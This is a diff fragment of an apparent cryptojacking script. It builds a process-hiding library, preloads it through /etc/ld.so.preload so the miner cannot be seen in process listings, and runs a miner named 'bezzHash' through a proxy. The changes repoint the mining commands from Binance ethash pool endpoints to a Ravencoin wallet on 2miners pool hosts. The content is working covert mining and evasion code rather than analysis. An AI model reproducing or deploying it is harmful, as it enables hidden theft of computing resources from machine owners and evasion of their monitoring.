@@ -54,16 +54,8 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:25
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-rvn.2miners.com:6060
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:443
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@asia-rvn.2miners.com:6060
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800
-
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:3333
-
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:8888
-
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:25
-
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:443
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@rvn.2miners.com:6060
